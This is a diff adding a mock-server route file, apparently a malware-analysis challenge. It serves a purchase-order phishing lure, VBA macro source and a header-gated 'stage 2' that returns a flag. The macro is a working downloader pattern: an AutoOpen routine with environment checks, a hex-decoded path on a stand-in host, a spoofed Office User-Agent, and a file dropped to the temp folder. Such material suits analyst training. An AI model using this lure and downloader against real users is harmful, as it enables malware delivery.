@@ -1,0 +1,72 @@
+ttl_minutes = 60
+flag_prefix = "order"
+
+[[route]]
+method = "GET"
+path = "/"
+[route.respond]
+status = 200
+content_type = "text/html; charset=utf-8"
+body = '''<!doctype html><html><head><meta charset="utf-8"><title>Brightwell Trading</title></head>
+<body style="font-family:sans-serif;max-width:32rem;margin:3rem auto"><h2>Brightwell Trading</h2>
+<p>Purchase order 88231 attached. Enable editing and content to view.</p>
+<p><a href="/dl/PO-88231_macro.bas.txt">PO-88231_macro.bas.txt</a> (extracted macro source)</p></body></html>
+'''
+
+[[route]]
+method = "GET"
+path = "/dl/PO-88231_macro.bas.txt"
+[route.respond]
+status = 200
+content_type = "text/plain; charset=utf-8"
+headers = { "content-disposition" = 'attachment; filename="PO-88231_macro.bas.txt"' }
+body = '''Attribute VB_Name = "Module1"
+' PO-88231 - extracted macro (VBA source, not a file that can run)
+Option Explicit
+
+Private Function HexDecode(s As String) As String
+    Dim i As Long, o As String
+    For i = 1 To Len(s) Step 2
+        o = o & Chr(CLng("&H" & Mid(s, i, 2)))
+    Next
+    HexDecode = o
+End Function
+
+Sub AutoOpen()
+    If Application.UserName = "" Then Exit Sub
+    If Environ("USERDOMAIN") = "WORKGROUP" Then Exit Sub
+    Dim u As String, p As String, b As Long, x As Object
+    u = Replace("hxxp://po-portal.invalid", "hxxp", "http")
+    p = "/upd/" & HexDecode("{{hex:d:tok}}") & "/po.bin"
+    b = 1337 Xor 42
+    Set x = CreateObject("MSXML2.ServerXMLHTTP")
+    x.Open "GET", u & p, False
+    x.setRequestHeader "User-Agent", "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Word 16.0.17328; Pro)"
+    x.setRequestHeader "X-Build", "B" & CStr(b)
+    x.Send
+    If x.Status = 200 Then
+        Dim f As Integer
+        f = FreeFile
+        Open Environ("TEMP") & "\po.dat" For Output As #f
+        Print #f, x.responseText
+        Close #f
+    End If
+End Sub
+'''
+
+[[route]]
+method = "GET"
+path = "/upd/{{d:tok}}/po.bin"
+[route.when]
+header = { "user-agent" = 're:^Microsoft Office/16\.0 ', "x-build" = 'B1299' }
+[route.respond]
+status = 200
+content_type = "text/plain; charset=utf-8"
+body = '''PO-88231 stage 2
+build: 1379
+config: key={{flag}} sleep=600
+'''
+
+[fallback]
+status = 404
+body = "Not Found"
